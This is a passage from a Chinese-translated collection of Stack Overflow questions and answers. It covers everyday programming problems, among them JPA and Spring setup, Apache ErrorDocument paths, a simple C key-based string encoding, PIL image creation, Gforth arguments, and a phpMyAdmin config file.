而不是 hibernate.cfg.xml，您将有一个名为“persistence.xml”的 xml（将驻留在资源/META-INF 中），它看起来像这样：

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"
    version="2.0">
    <persistence-unit name="myPersistanceUnit">

        <class>com.company.entities.Entity1</class>
        <class>com.company.entities.Entity2</class>
        <class>com.company.entities.Entity3</class>

        <properties>
            <property name="hibernate.dialect" value="org.hibernate.dialect.DerbyDialect" />
            <property name="hibernate.show_sql" value="true" />
        </properties>

    </persistence-unit>
</persistence> 
```

您的 ApplicationContext.xml 将具有以下内容：

```
<tx:annotation-driven />

    <bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager"
        p:entityManagerFactory-ref="entityManagerFactory" />

<!-- The data source is configured in the application server but spring also supports a configured bean -->
    <bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">
        <property name="jndiName" value="jdbc/MyDataSource" />
    </bean>

    <bean id="entityManagerFactory"
        class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <property name="dataSource" ref="dataSource" />
        <property name="persistenceUnitName" value="myPersistanceUnit" />
        <property name="jpaVendorAdapter">
            <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
                <property name="databasePlatform" value="org.hibernate.dialect.DerbyDialect" />
            </bean>
        </property>
    </bean> 
```

代替休眠注释，您将使用 JPA 注释（基本相同 - 在 javax.persistence 包下）并且您的基本 dao 调用将使用

```
@PersistenceContext
    protected EntityManager entityManager; 
```

处理数据库操作。在这些配置下，我认为您不会有任何问题。

# php - 尝试使用 ErrorDocument 时出现 404 Not Found 错误

> ID：12760351
> 
> 赞同：28
> 
> 时间：2012-10-06T13:47:58.047
> 
> 标签：php, apache, .htaccess, http-status-code-404

我知道这个帖子在网上和这里已经讨论了很多，我尝试了几乎所有的方法，但我仍然遇到同样的问题。

这是我在本地服务器上的 url ( MAMP )

```
http://localhost:8888/hellothere/index.php 
```

而且我试图插入错误的路径将我带到错误的页面，如下所示：

```
http://localhost:8888/hellothere/eiurgiuerib 
```

它没有将我带到错误页面，而是显示：

```
Not Found

The requested URL /hellothere/eiurgiuerib was not found on this server.

Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. 
```

我的 404 页面位于错误目录中。在我的 .htaccess 文件中，我包含了这个：

```
ErrorDocument 404 /Error/404.php 
```

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-10-06T14:47:12.823

该`ErrorDocument`指令在提供本地 URL 路径时，期望该路径完全符合`DocumentRoot`. 在您的情况下，这意味着到的实际路径`ErrorDocument`是

```
ErrorDocument 404 /hellothere/error/404page.html 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-08T06:19:00.370

当我们应用本地 url 时，ErrorDocument 指令需要来自 DocumentRoot 的完整路径。所以，

```
 ErrorDocument 404 /yourfoldernames/errors/404.html 
```

# c - 用 C 中的键字符串对字符串进行编码

> ID：12760367
> 
> 赞同：1
> 
> 时间：2012-10-06T13:51:16.563
> 
> 标签：c

我想使用密钥字符串对 C 中的字符串进行编码。该`encodeMSG`函数返回 int 数组，因此：
`intArr[i] = the int value of msg[i] + the int value of key[i]`.
如果 key 字符串的长度比 msg 字符串短，它应该回到开头（循环）。

我不确定我应该怎么做，虽然它看起来不太复杂。
我也不确定我应该使用`atoi(msg + i)`还是像`(int)(*(msg + i))`.

```
int *encodeMSG(char *msg, char *key)
{
   int i, msgLen;
   int *encodedArr = (int *)malloc(strlen(msg) * sizeof(int));
   char *keyBackup = key;
   msgLen = (strlen(msg));

   for (i = 0; i < msgLen; ++i)
   {
       if (*(key + i) == '\0')
           key = keyBackup;

       *(encodedArr + i) = *(msg + i); //creating an integer-represented array of the char array [msg]
       *(encodedArr + i) += *(key + i); //adding the [key] array integer values to the integer-represented array of the message
   }

   return encodedArr;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:22:36.497

试试这个：

```
int *encodeMSG(char *msg, char *key)
{
    char *key0 = key;
    int *result = (int*) malloc( sizeof(int)*(strlen(msg)+1) );
      // +1 to include the final zero of msg
    int *result0 = result;
    while( *msg ) // i assume it's zero-terminated
    {
        *result++ = ((int)*msg) + ((int)*key);
        ++msg;
        ++key;
        if(!*key)key=key0; // reset it to the beginning of the key
    }
    *result = 0; // the final zero
    return result0;
} 
```

这将直接使用 ascii 值， atoi 在这里没有用。请注意， *msg 是 msg 指向的实际字符。由于 msg 是以零结尾的，字符串的结尾是 0 的 false。同样适用于*key，当*key == 0（或！*key）时，只需将其重置为关键短语的开头。

顺便说一句：它返回一个 int[]，比 msg 中的字符多 1 个 int，最后一个 int 为零。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:02:50.280

如果您正在寻找 ASCII 编码，只需使用：

```
for(i=0; i<msglen; ++i)
  res[i] = msg[i] + key[i%key_len] 
```

但是，如果您的字符包含一个数字，您可以简单地将其整数值作为

```
int a = ch - '0'    // if ch = '5' then value of a comes out to be 5 
```

如果您不减去“0”，则 a 的值为 53（ASCII 值为“5”）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T18:27:52.570

较短的版本：

```
int *encodeMSG(char *msg, char *key)
{
  int *result = (int*) malloc( sizeof(int)*(strlen(msg)+1) );
  int key_len = strlen(key);

  for(size_t i=0, msglen=strlen(msg); i<msglen; ++i )
     result[i] = msg[i] + key[i % key_len];

   result[i] = 0; // the final zero
   return result;
 } 
```

# .net - 使用双线字体在图像上绘制水印字符串

> ID：12760368
> 
> 赞同：1
> 
> 时间：2012-10-06T13:51:28.757
> 
> 标签：.net, graphics, system.drawing

我需要使用双线字体在图像上绘制水印字符串。字体应该是可配置的，但字符应该始终使用双线绘制。我附上了一张图片，结果图片应该是什么样子：

![双线字体水印](../Images/6c68f0086f3569cf068129a822ae9ab6.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T17:20:52.330

您可以通过将文本转换为路径并使用部分透明的笔绘制路径来获得此信息。要使用的核心 api 是 Graphics.AddText()。这是一个使用它的示例方法：

```
 public static Bitmap Watermark(Image srce, string text, Font font, float angle) {
        Bitmap dest = new Bitmap(srce);
        var color = Color.FromArgb(120, Color.White);
        using (var gr = Graphics.FromImage(dest)) 
        using (var gp = new GraphicsPath())
        using (var pen = new Pen(color, 5)) {
            var sf = new StringFormat();
            sf.LineAlignment = sf.Alignment = StringAlignment.Center;
            gp.AddString(text, font.FontFamily, (int)font.Style, font.SizeInPoints, 
                         new Rectangle(-dest.Width/2, -dest.Height/2, dest.Width, dest.Height), 
                         sf);
            gr.TranslateTransform(dest.Width / 2, dest.Height / 2);
            gr.RotateTransform(-angle);
            gr.DrawPath(pen, gp);
        }
        return dest;
    } 
```

示例用法：

```
 using (var bmp = Properties.Resources.Penguins) 
    using (var font = new Font(new FontFamily("Arial"), 144)) {
        pictureBox1.Image = Watermark(bmp, "DEMO", font, 45);
    } 
```

产生：

![在此处输入图像描述](../Images/4a6b2afea7af2539de419dfc5f41b60a.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:10:30.677

总是在一些搜索引擎中输入您的问题，我发现这个正在寻找类似的答案：

[http://www.neowin.net/forum/topic/269276-c-drawing-outline-text/](http://www.neowin.net/forum/topic/269276-c-drawing-outline-text/)

# c# - 在 Windows 8 应用程序中访问我的 GridViewItem 的 UI 元素

> ID：12760372
> 
> 赞同：0
> 
> 时间：2012-10-06T13:51:50.760
> 
> 标签：c#, windows-8, microsoft-metro, winrt-xaml

在 XAML 中，我实现了一个与数据绑定的 GridView。在 GridViewItem 中，我放置了一个带有 TextBlock 等的 StackPanel，并且我想在单击特定 GridViewItem 时操纵 TextBlock 的外观（通过其属性）。我无法从 C# 代码中访问 TextBlock，因此我也无法访问其属性。我在这里想念什么？提前致谢。这是一些 XAML 代码：

```
<GridView x:Name="gw" ...>
   <GridView.ItemTemplate>
      <DataTemplate>
         <GridViewItem x:Name="gwi">
           <StackPanel>
              <TextBlock x:Name="tb">
                 <Run Text="{Binding SomeData}"/>
              </TextBlock>
           </StackPanel>
        </GridViewItem>
      </DataTemplate>
   </GridView.ItemTemplate>
</GridView> 
```

在本例中，如何使用名为 TextBlock 的“tb”及其属性？我只能使用“gw”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:36:01.613

我认为不可能访问数据模板中的每个单独元素。但是，您可以使用数据绑定修改 TextBlock 的属性。您可以根据需要使用绑定转换器来转换值。

请参阅[http://msdn.microsoft.com/en-us/library/system.windows.data.binding.converter.aspx](http://msdn.microsoft.com/en-us/library/system.windows.data.binding.converter.aspx)

# html - 如何正确设置页面结构

> ID：12760373
> 
> 赞同：3
> 
> 时间：2012-10-06T13:51:59.650
> 
> 标签：html, mysqli, php

提交后我无法显示正确的详细信息。我认为我的页面结构不正确 目前发生的情况是，如果我单击`Module`提交按钮，则不会显示任何不正确的内容。

以下是假设发生的情况：（该页面分为 3 个部分）

**第 1 部分：**包含一个模块下拉菜单。用户从下拉菜单中选择选项并提交。每次提交时，它都会更改第 2 部分，并且隐藏第 3 部分。提交后下拉菜单返回请选择选项。

**第 2 部分：**包含评估下拉菜单，仅在用户提交第 1 部分后出现。当用户从评估下拉菜单中选择选项并单击提交按钮提交此部分时，下拉菜单返回请选择并出现第 3 部分. 每次提交第 2 部分时，第 3 部分都会更改，并带有不同的选项。

**第 3 部分：**显示第 2 部分的详细信息。仅根据从第 2 部分选择和提交的评估显示和更改。如果用户从第 1 部分提交，则隐藏此部分。

现在我的尝试是将 php 和 phmtl 彼此分开，但就像我说的那样，他的问题是没有显示任何细节。忍受我有很多代码，但那是因为我需要展示我的页面的结构。我的问题是我需要做什么才能修复页面结构？

您可以在此处查看应用程序发生的情况：[应用程序](http://helios.hud.ac.uk/u0867587/Mobile_app/InputTest.php)

以下是按显示顺序排列的代码：（我试图尽可能地限制）：

**PHP：**

```
 <?php

// connect to the database

$moduleactive = 1;

$sql = "SELECT ModuleId, ModuleNo, ModuleName FROM Module WHERE ModuleActive = ? ORDER BY ModuleNo";

//excute query

$sqlnum = $sqlstmt->num_rows();

$moduleHTML = "";
$moduleHTML .= '<select name="modules" id="modulesDrop">' . PHP_EOL;
$moduleHTML .= '<option value="">Please Select</option>' . PHP_EOL;

while ($sqlstmt->fetch()) {
    $moduleHTML .= sprintf('<option value="%1$s_%2$s_%3$s">%1$s - %2$s</option>' . PHP_EOL, $dbModuleNo, $dbModuleName, $dbModuleId);
}

$moduleHTML .= '</select>';

$pHTML = "";

//Module Submit (Part 1 Submitted)    
if (isset($_POST['moduleSubmit'])) {
    $sessionquery = " 
SELECT s.SessionId, SessionName, SessionDate, SessionTime, ModuleId, SessionActive, Complete 
FROM Session s 
INNER JOIN Session_Complete sc ON sc.SessionId = s.SessionId 
WHERE 
(ModuleId = ? AND SessionActive = ? AND Complete = ?) 
ORDER BY SessionName  
";

    $active   = 1;
    $complete = 1;

    //execute query 

    $sessionnum = $sessionqrystmt->num_rows();

    $sessionHTML = '';

    if ($sessionnum == 0) {
        $pHTML = "<span style='color: red'>Sorry, You have No Assessments under this Module</span>";
    }

    $sessionHTML = '<select name="session" id="sessionsDrop">' . PHP_EOL;
    $sessionHTML .= '<option value="">Please Select</option>' . PHP_EOL;

    while ($sessionqrystmt->fetch()) {
        $sessionHTML .= sprintf("<option value='%s'>%s - %s - %s</option>", $dbSessionId, $dbSessionName, date("d-m-Y", strtotime($dbSessionDate)), date("H:i", strtotime($dbSessionTime))) . PHP_EOL;
    }

    $sessionHTML .= '</select>';

}

//Session Submit (Part 2 Submitted)

if (isset($_POST['sessionSubmit'])) {
    $sessiondetailsquery = " 
    SELECT SessionId, SessionName 
    FROM Session 
    WHERE 
    (SessionId = ?) 
";

    //execute query

    $sessiondetailsqrystmt->bind_result($detailsSessionId, $detailsSessionName);

}

?> 
```

**PHTML：**

```
 <form action="<?php
    echo htmlentities($_SERVER['PHP_SELF']);
    ?>" method="post"> 
    <table> 
    <tr> 
    <th>Module: <?php
    echo $moduleHTML;
    ?></th> 
    </tr> 
    </table> 
    <p><input id="moduleSubmit" type="submit" value="Submit Module" name="moduleSubmit" /></p> 

      <?php
    if ($step == 2) {
        if (!$_POST['moduleSubmit']) {
            if ($_POST['modules'] == '') {
    ?>  
               <span style='color: red'>Please Select a Module</span>  
           <?php
            } elseif (!$sqlnum) {
    ?>  
               <span style='color: red'>Sorry, You have No Assessments under this Module</span>  
            <?php
            } else {
    ?>  
        <p><strong>Assessments:</strong> {$sessionHTML} </p>   
        <p><input id='sessionSubmit' type='submit' value='View Assessment Details' name='sessionSubmit' /></p>  
         <?php
            }
        }
    }
    ?> 

      <?php
    if ($step == 3) {
        if (!$_POST['sessionSubmit']) {
            if ($_POST['session'] == '') {
    ?>  
               <span style='color: red'>Please Select an Assessment</span>  
            <?php
            } else {
    ?>   

    <table> 
    <tr> 
    <td></td> 
    <td><input type='text' id='currentId' name='Idcurrent' readonly='readonly' value='$detailsSessionId' /></td> 
    </tr> 
    <tr> 
    <td><strong>Assessment:</strong></td> 
    <td>{$detailsSessionName}</td> 
    </tr> 
    </table> 
         <?php
            }
        }
    }
    ?> 

    </form> 

        </body> 
    </html> 
```

**更新：**

```
Notice: Undefined index: modules in ...on line 66
Notice: Undefined offset: 1 in ... on line 68 
Notice: Undefined offset: 2 in ... on line 69
Notice: Undefined index: modules in ... on line 116 
```

PHP 小提琴更新： http: [//phpfiddle.org/main/code/cbx-6mi](http://phpfiddle.org/main/code/cbx-6mi)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T06:26:16.093

我不完全确定您希望结构如何，但据我所知，这是您问题的答案。

您应该看到结构，希望您可以使用它 =)

这个想法是根据用户给我们的信息量来显示一个部分。

并且还允许用户返回并更改旧数据。

我已经注释掉了你的一些“代码”，并添加了一些你应该删除的选项。但是这些东西应该向您展示建议的结构，而无需您被迫输入代码。

```
<html>
<body>
<form action="" method="post"> 
    <table> 
        <tr> 
            <th>
                <?php
                    // connect to the database
                    //$sql = "SELECT ModuleId, ModuleNo, ModuleName FROM Module WHERE ModuleActive = ? ORDER BY ModuleNo";
                    //excute query
                    //$sqlnum = $sqlstmt->num_rows();
                ?>
                Module: 
                <select name="module" id="modulesDrop">
                    <option value="">Please Select</option>
                    <?php
                        /*
                        while ($sqlstmt->fetch()) {
                            echo sprintf('<option value="%1$s_%2$s_%3$s">%1$s - %2$s</option>' . PHP_EOL, $dbModuleNo, $dbModuleName, $dbModuleId);
                        }
                        */
                    ?>
                    <option value="test">test</option>
                </select>
            </th> 
        </tr> 
    </table> 
    <input id="moduleSubmit" type="submit" value="Submit Module" name="moduleSubmit" />
</form>
<?php
if(isset($_POST["module"]))
{
?>
<form action="" method="post"> 
    <input type="hidden" name="module" value="$_POST[module]">
    Assigments: 
    <?php
        $sessionquery = "SELECT s.SessionId, SessionName, SessionDate, SessionTime, ModuleId, SessionActive, Complete 
        FROM Session s 
        INNER JOIN Session_Complete sc ON sc.SessionId = s.SessionId 
        WHERE 
        (ModuleId = ? AND SessionActive = ? AND Complete = ?) 
        ORDER BY SessionName";

        //execute query 

        //$sessionnum = $sessionqrystmt->num_rows();

        if ($sessionnum == 0 && false) // "&& false" should ofcourse be removed
        {
        ?>
    <span style='color: red'>Sorry, You have No Assessments under this Module</span>
        <?php
        }
        else
        {
        ?>
    <select name="session" id="sessionsDrop">
        <option value="">Please Select</option>
        <?php
            /*
            while ($sessionqrystmt->fetch()) {
                $sessionHTML .= sprintf("<option value='%s'>%s - %s - %s</option>", $dbSessionId, $dbSessionName, date("d-m-Y", strtotime($dbSessionDate)), date("H:i", strtotime($dbSessionTime))) . PHP_EOL;
            }
            */
            echo "<option value='tst'>tst</option>";
        ?>
    </select>
    <br>
    <input type="submit" value="Submit Assigments">
</form>
<br>
<br>
    <?php
    if(isset($_POST["session"]))
    {
        ?>
            <table> 
                <tr> 
                    <td></td> 
                    <td><input type='text' id='currentId' name='Idcurrent' readonly='readonly' value='$detailsSessionId' /></td> 
                </tr> 
                <tr> 
                    <td><strong>Assessment:</strong></td> 
                    <td>{$detailsSessionName}</td> 
                </tr> 
            </table> 
        <?php
        }
    }
}
?>
</body>
</html> 
```

如果您只希望当时显示一个“步骤”，请使用“else if”而不是“if”（当然它需要的不止于此，但您应该了解如何做到这一点？）

# php - 在php中读取用户环境变量

> ID：12760375
> 
> 赞同：5
> 
> 时间：2012-10-06T13:52:16.233
> 
> 标签：php, environment-variables

我在 Windows 环境变量 -> 用户变量中定义了一个环境变量

```
$MY_VARIABLE=mypath 
```

在php中我尝试像下面一样访问它

```
<?php
echo $_ENV["MY_VARIABLE"]; 
```

但它不打印任何东西。我在这里遗漏了什么还是 PHP 无法访问用户环境变量？

**编辑：我将 PHP 作为 Apache 模块运行（我最初遗漏的重要信息）。**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-06T14:14:44.423

[由于PHP 中的 variables_order 设置，](http://us.php.net/manual/en/ini.core.php#ini.variables-order)您`$_ENV`是空的

编辑你的 PHP.INI

改变

```
 variables_order = "GPCS" 
```

至

```
 variables_order = "EGPCS" 
```

如果它不尝试使用`.htaccess`来实现这一点，它现在应该可以工作了

将以下内容添加到您的`.htaccess`

```
SetEnv foo bar 
```

您可以通过 PHP 获取它

```
var_dump(getenv('foo'),$_ENV); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-11-04T19:00:49.807

最近我写了一个库来从环境变量中获取值并解析为 PHP 数据类型。该库可用于将环境变量解析为 PHP 数据类型（如转换为整数、浮点数、空值、布尔值），解析 JSON 字符串等复杂数据结构，以及更多社区的贡献。

该库可在此处获得：[https ://github.com/jpcercal/environment](https://github.com/jpcercal/environment)

并从环境变量中获取值来做到这一点：

```
<?php
// ...
require "vendor/autoload.php";
// ...
var_dump(Cekurte\Environment\Environment::get("MY_VARIABLE")); 
```

好好享受。

# actionscript-3 - SWF 丢失 CLASS 数据

> ID：12760379
> 
> 赞同：0
> 
> 时间：2012-10-06T13:53:14.747
> 
> 标签：actionscript-3

加载外部 swfs 时遇到一个奇怪的问题

直接执行时它自己的 swf 运行平稳，没有问题，但是，当加载时（通过 embed、loader、uiLoader），它总是同样的问题，它返回关于我的 AssetMnger 类的错误，其中包含不同的静态变量供其他类使用，错误只是说明变量不存在

我对 swf 进行了测试，一旦加载它就不再承认 AssetManger 的存在而只需创建一个新的空类，而是使用相同的名称

那么为什么我会失去这门课呢？老实说，我不知道为什么会这样

任何想法，将不胜感激

更新：

发布此问题后问题很快得到解决您是对的 Antoine，我有一个包含同名类的预加载器因此存在轻微冲突

我不知道当 Flash 处理嵌入的 SWF 类时，它是针对整个应用程序而不是 SWF 文件来处理它自己的

无论如何，谢谢你的时间

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T21:27:51.510

它看起来像类定义的冲突。发布错误可能很有用，但请确认`AssetMngr`主 SWF 中没有已编译的不同版本。如果是这种情况，请重新编译所有 SWF 文件或`LoaderContext.applicationDomain`在加载 SWF 文件时尝试使用。

有关详细信息，请参阅[http://help.adobe.com/en_US/as3/dev/WSd75bf4610ec9e22f43855da312214da1d8f-8000.html](http://help.adobe.com/en_US/as3/dev/WSd75bf4610ec9e22f43855da312214da1d8f-8000.html)。

# .net - 向 CLR 的 DynamicMethod 添加状态的最简单方法是什么？

> ID：12760383
> 
> 赞同：2
> 
> 时间：2012-10-06T13:53:34.623
> 
> 标签：.net, clr, code-generation, dynamicmethod, dynamic-method

我正在使用 DynamicMethod 进行一些代码生成，我有一个问题可以通过添加一个小状态来轻松解决，比如一个字段。不幸的是，我无法将此状态推送到方法的参数之一中，所以我基本上需要关闭像这个小 lambda 这样的本地：

```
var i = 0;
return new Func<int>(() => i++); 
```

最简单的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:43:15.427

I believe you can't do that, at least not directly. `DynamicMethod` lets you create a single CLR method and nothing else. C# methods don't have that limitation, they are free to create closure types and fields in them and whatever else they need.

To achieve what you want, you could use [`TypeBuilder`](http://msdn.microsoft.com/en-us/library/system.reflection.emit.typebuilder.aspx) to dynamically build a full type with a method and a field.

But a simpler option would be to create the method with the state as a parameter and then use a closure (or, alternatively, a normal object) to capture the state. Something like:

```
Action<TData> CaptureState<TState, TData>(
    Action<TState, TData> originalAction, TState initialState)
{
    var state = initialState;
    return data => originalAction(state, data);
} 
```

You would then use it like this:

```
Action<State, string> generated = …;
Action<string> captured = CaptureState(generated, new State());
captured("data1");
captured("data2"); 
```

If your method needs to change the value of the state (and not just modify some properties on it), then you would need to use `ref` parameter for the state, but the principle works the same (it would also mean you would need to use custom delegate type).

# jquery - 如何从 jsf Web 应用程序检测数据库中的更改

> ID：12760385
> 
> 赞同：0
> 
> 时间：2012-10-06T13:54:02.187
> 
> 标签：jquery, ajax, jsf

我刚刚完成了一个 jsf 应用程序并准备部署，但遇到了一些问题。我的应用程序有一个表，每一行代表一个员工。现在我已经用 jquery 指示了一个恢复/暂停状态链接，指示是否可以对员工执行任何操作（恢复）或不能对员工执行任何操作（暂停） .我用jquery实现了这个功能，因为我不希望页面刷新篡改这些链接。现在出现一个场景，假设链接最初显示暂停表示按下它，暂停员工并显示简历。现在想象2个用户一个人按下了改变的链接，但另一个人看到了初始的链接值。当这个人按下这个改变数据库值的链接时，事情变得非常混乱。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-08T10:57:37.967

您应该阅读并尝试更多关于服务器端推送机制的信息，以便找到解决此问题的方法。Javascript/JQuery AJAX 轮询技术可用于不时从服务器检索更新的数据。大多数 JSF 组件库都将此功能集成到他们的库中，您可以根据自己的喜好使用它。还有 Comet/bayeux 作为您可以使用的技术，但它有点复杂。这个链接是一个很好的起点，您可以从它开始...

[http://techoctave.com/c7/posts/60-simple-long-polling-example-with-javascript-and-jquery](http://techoctave.com/c7/posts/60-simple-long-polling-example-with-javascript-and-jquery)

# android - 延迟android PlusClient登录请求

> ID：12760387
> 
> 赞同：2
> 
> 时间：2012-10-06T13:54:25.873
> 
> 标签：android, google-plus-one, google-play-services

我正在尝试在我的 android 应用程序中实现新的 PlayServices API 以使用 +1 按钮。

我让它工作得很好，所有预期的功能都在那里。然而，它有一个相当烦人的功能（真的是谷歌！）。当您实例化 plusclient 时：

```
mPlusClient = new PlusClient(this, this, this, Scopes.PLUS_PROFILE); 
```

您的用户会看到一个“选择您的帐户”对话框（如果他们有多个帐户），然后是一个“授予访问权限”对话框。我理解这些步骤的必要性，但是它们确实妨碍了用户体验！

我的初始活动（启动画面后）现在有 +1 按钮，这意味着您必须实例化 PlusClient。在 onCreate() 方法中这样做（正如谷歌所建议的那样）意味着我的用户甚至在他们知道发生了什么之前就获得了“授权”屏幕！

我想要做的是延迟，直到他们真正点击 +1 按钮。这样他们就会知道为什么要求他们授权访问他们的帐户！

有任何想法吗？我尝试在 +1 按钮上使用 onClick 侦听器来实例化，但它没有用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T21:33:27.223

您将需要删除`Scopes.PLUS_PROFILE`所需的行为。Google+ 的文档已更新以反映这一点。

```
mPlusClient = new PlusClient(this, this, this); 
```

# objective-c - 如何设置一个以绝对值表示未来时间的变量Objective-C

> ID：12760388
> 
> 赞同：0
> 
> 时间：2012-10-06T13:54:37.543
> 
> 标签：objective-c, synchronization, benchmarking

**动机：**我正在开发一个应用程序，它可以让多个（客户端）手机从（服务器）手机读取音频数据。这个想法是他们必须在*完全相同的*时间一起*播放*这首歌。

 ***前提：**我必须想办法让所有手机都以绝对的某个时间戳开始（即它与任何一部手机的使用设置时钟无关等）..根据一些[研究](https://stackoverflow.com/a/9780469/766570)，我想出了最好的方法这样做是为了使用`CFAbsoluteTimeGetCurrent();`这里的想法是我得到服务器与每部电话通信所需的延迟（b/c GKSession 显然是串行而不是并行完成的），将该延迟添加到当前时间，然后让每部电话从该开始时间开始播放歌曲。这个开始时间*必须*是绝对的，不能是相对的。

**问题：**我如何用数字表示未来的时间，以后可以用来构造[CFDateRef](https://developer.apple.com/documentation/corefoundation/cfdateref)。（它必须以数字表示的原因是我必须能够以数据包的形式发送它..）

**示例：**这是一段代码，解释了我想要实现的目标：

```
-(void)viewDidLoad
{
    _timer = [Timer new];
    [_timer setCurrentTimeAsReferencepoint];

    [self performSelector:@selector(performAction) withObject:NULL afterDelay:5];
}

-(void)performAction
{
    double diff = [_timer getTimeElapsedinAbsTime];
    double timeInFuture = diff + [Timer getCurTime];
    NSLog(@"this is time in future in abs terms %f",timeInFuture);

    CFDateRef futureDate = CFDateCreate(NULL, timeInFuture);
    CFDateRef dateNow = CFDateCreate(NULL, [Timer getCurTime]);

    Boolean keepTesting = true;

    while (keepTesting) {
        if (CFDateCompare(dateNow, futureDate,NULL) == 0)   // ie both times are equal
        {
            NSLog(@"now is the time!");
            keepTesting = false;
        } else {
            NSLog(@"now isn't the time.. skip");
        }
    }
} 
```

在 Timer.m 中：

```
-(void)setCurrentTimeAsReferencepoint
{
    _referencePoint = [[self class] getCurTime];
    NSLog(@"this is reference point %f",_referencePoint);  
}

+(double)getCurTime
{
    return (double)CFAbsoluteTimeGetCurrent();
}

// not used in the above code.. but used when i compare the time of the server phone with the client phone
+(double)getTimeDifference:(double)time1
                     time2:(double)time2
{    
    CFDateRef newDate = CFDateCreate(NULL, time2);
    CFDateRef oldDate = CFDateCreate(NULL, time1);

    CFTimeInterval difference = CFDateGetTimeIntervalSinceDate(newDate, oldDate);    

    NSLog(@"this is time difference %f",fabs(difference));
    CFRelease(oldDate); CFRelease(newDate); 

    // fabs = absolute value
    return fabs(difference);    
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-08T06:31:07.630

事实证明它比我想象的要简单（注意：getCurTime 在问题中定义）：

```
-(void)performAction
{
    double curTime = [Timer getCurTime];
    double timeInFuture = 2 + curTime;
    NSLog(@"this is time in future in abs terms %f and this is curTime %f",timeInFuture, curTime);

    CFDateRef futureDate = CFDateCreate(NULL, timeInFuture);
    CFDateRef dateNow = CFDateCreate(NULL, curTime);

    Boolean keepTesting = true;

    while (keepTesting) {
        dateNow = CFDateCreate(NULL, [Timer getCurTime]);
        if (CFDateCompare(dateNow, futureDate,NULL) >= 0)   // ie both times are equal or we've 
                                                            // gone past the future date time
        { 
            NSLog(@"now is the time!");
            keepTesting = false;
            return;
        } else {
            NSLog(@"now isn't the time.. skip");
        }
    }
} 
```*

# python - 如何在 Python 中创建一个空的 n*m PNG 文件？

> ID：12760389
> 
> 赞同：44
> 
> 时间：2012-10-06T13:54:38.427
> 
> 标签：python, png, python-imaging-library

我想将 4 张 PNG 图像合并到一个 PNG 文件中。我知道谁将它们与 Image.paste 方法结合起来，但我无法创建保存输出文件！实际上，我想要一个 *m 空 PNG 文件，并用来组合我的图像。我需要指定文件大小，否则我不能使用*粘贴*方法。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-10-06T13:57:51.660

```
from PIL import Image
image = Image.new('RGB', (n, m)) 
```

* * *

## 回答 #2

> 赞同：60
> 
> 时间：2017-06-04T02:30:24.910

您可以使用该方法`PIL.Image.new()`创建图像。但默认颜色为**黑色**。要制作全**白**背景的空图像，您可以使用以下代码对其进行初始化：

```
from PIL import Image
img = Image.new("RGB", (800, 1280), (255, 255, 255))
img.save("image.png", "PNG") 
```

它创建一个大小为 800x1280 的图像，带有白色背景。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-06T14:02:22.870

你对哪个部分感到困惑？您可以通过执行来创建新图像`Image.new`，如文档中所示。无论如何，这是我很久以前编写的一些代码，用于在 PIL 中将多个图像合并为一个。它将它们全部放在一行中，但您明白了。

```
max_width = max(image.size[0] for image in images)
max_height = max(image.size[1] for image in images)

image_sheet = Image.new("RGBA", (max_width * len(images), max_height))

for (i, image) in enumerate(images):
    image_sheet.paste(image, (
        max_width * i + (max_width - image.size[0]) / 2,
        max_height * 0 + (max_height - image.size[1]) / 2
    ))

image_sheet.save("whatever.png") 
```

# forth - 如何在 Forth 中访问程序名称/argv[0]？

> ID：12760390
> 
> 赞同：4
> 
> 时间：2012-10-06T13:54:40.290
> 
> 标签：forth, gforth

Gforth[文档](http://www.complang.tuwien.ac.at/forth/gforth/Docs-html/OS-command-line-arguments.html)说通过调用来访问参数`next-arg`，但这省略了程序名称，它将以类似 C 的语言打印。

由于`argv[0]`似乎自动从 Forth 中的参数向量中删除，有没有我可以调用的特殊函数返回它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-06T19:49:28.320

`sourcefilename`给出程序的名称，并`n arg`获取发送到 gforth 的参数，包括 gforth 二进制名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-11-05T23:08:55.550

`0 arg`将始终返回`argv[0]`，而 arg 列表的其余部分由`next-arg`. `sourcefilename`是您刚刚加载的文件的名称。

# mysql - #1146 - 表 'phpmyadmin.pma_recent' 不存在

> ID：12760394
> 
> 赞同：48
> 
> 时间：2012-10-06T13:55:05.703
> 
> 标签：mysql, database, phpmyadmin

解决方案大佬...

仅供参考，我正在使用 xampp 来使用 phpmyadmin。在本地主机上创建数据库的过程中会发生此错误。下面是 phpmyadmin 目录下 config.inc 文件的代码：

```
<?php
/*
 * This is needed for cookie based authentication to encrypt password in
 * cookie
 */
$cfg['blowfish_secret'] = 'xampp'; /* YOU SHOULD CHANGE THIS FOR A MORE SECURE COOKIE      AUTH! */

/*
 * Servers configuration
 */
$i = 0;

/*
